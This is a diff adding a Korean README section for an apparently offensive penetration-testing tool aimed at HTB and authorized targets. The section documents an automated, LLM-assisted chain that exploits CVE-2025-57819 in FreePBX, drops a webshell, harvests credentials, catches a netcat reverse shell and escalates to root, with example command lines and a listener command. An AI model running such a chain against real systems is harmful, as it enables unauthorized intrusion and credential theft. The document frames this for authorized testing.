@@ -521,6 +521,40 @@ assassin 10.129.1.5 --full-auto --llm claude --html --json
 
 > ⚠️ 권한이 확인된 대상(HTB·인가된 진단)에서만. 자격·대상 모두 범위 가드의 통제를 받는다.
 
+### 10.4 내장 익스 모듈 — 최신 CVE 자동화 + 발판 체인 완성(옵트인)
+
+`--auto-poc` 의 searchsploit 경로는 **exploit-db 에 등록된** PoC 만 찾는다. 2025년 CVE 처럼 아직
+미등재인 건은 내장 익스 모듈 레지스트리(`exploit_modules`)가 메운다. 모듈은 **무기화된 익스 코드를
+담지 않고**, CVE별로 (핑거프린트 매칭·취약버전·공개 PoC 조달 방법·실행 템플릿·출력→웹셸 URL 파서)
+메타데이터만 담는다. 실제 PoC 소스는 **런타임에 공개 출처에서 조달**한다(대량 악용 표면 비생성).
+
+핑거프린트된 제품/버전이 모듈과 매칭되면 `--full-auto`(또는 `--exploit-exec --auto-poc`)가 다음을 잇는다:
+
+1. **PoC 조달(게이트-세이프)** — 로컬 선조달분 또는 `searchsploit -m`(로컬 무해). exploit-db 에 없는
+   CVE 는 자동으로 외부 clone 하지 않고 **1회 수동 조달 안내**(git)만 남긴다(스코프 게이트 보존).
+   받아 둔 디렉터리는 `--poc-dir` 로 지정하거나 `~/.assassin/pocs/<CVE>/`·현재 디렉터리에 둔다.
+2. **PoC 실행 → 웹셸 URL 캡처** — PoC 출력에서 드롭된 웹셸 URL(`?cmd=`)을 잡아 웹 RCE 발판으로 잇는다.
+3. **user 플래그** — 발판이 서면 설정/DB 자격 수확 + `user.txt` 읽기가 자동으로 따라온다.
+4. **nc 리버스셸 수신(`--catch-revshell`)** — 리스너를 백그라운드로 띄우고 웹셸로 리버스셸 payload 를
+   쏴 콜백을 수신(수동 `nc -lvnp 4444` 과정 자동화). 성립하면 더 안정적인 셸로 승격, 실패해도 웹 발판 유지.
+5. **privesc 폐루프** — 발판 세션 위에서 열거→HIGH 벡터 랭킹→one-shot 상승→`uid=0`→`root.txt` 를 자동 시도
+   (웹셸/리버스셸 발판 모두. 표준 GTFOBins 경로 밖이면 생성 전용 제안으로 남긴다).
+
+| 항목 | 내용 |
+|---|---|
+| 켜는 법 | `assassin <t> --full-auto --attacker-ip <tun0 IP> --llm claude` (리버스셸 수신까지 자동) |
+| PoC 선조달 | `assassin <t> --full-auto --poc-dir ~/pocs` — 미등재 CVE PoC 를 1회 받아 두면 이후 자동 사용 |
+| 수록 CVE | `CVE-2025-57819`(FreePBX < 16.0.89 pre-auth RCE) 외 추가 예정 |
+| 안전 | 전부 옵트인·스코프 게이트·3관문 하. 무기 코드 비탑재(공개 PoC 런타임 조달). 인가/CTF 대상 전용 |
+
+```bash
+# connected.htb(FreePBX) 류: 핑거프린트→CVE-2025-57819 PoC→웹셸→nc 수신→user→privesc 자동
+assassin 10.129.1.5 --full-auto --attacker-ip 10.10.14.13 --poc-dir ~/pocs --llm claude --html
+```
+
+> 자동 root 는 **표준 상승 경로(sudo/SUID/capability GTFOBins)**가 있을 때만 성립한다. 비표준 체인
+> (DB UDF·특정 커널 LPE 등)은 설계상 자동 발사하지 않고 열거·제안으로 남긴다(정직성 §3, 안전 §4).
+
 ---
 
 ## 11. 산출물: 라이트업 · 리포트 · 로그 · 재개
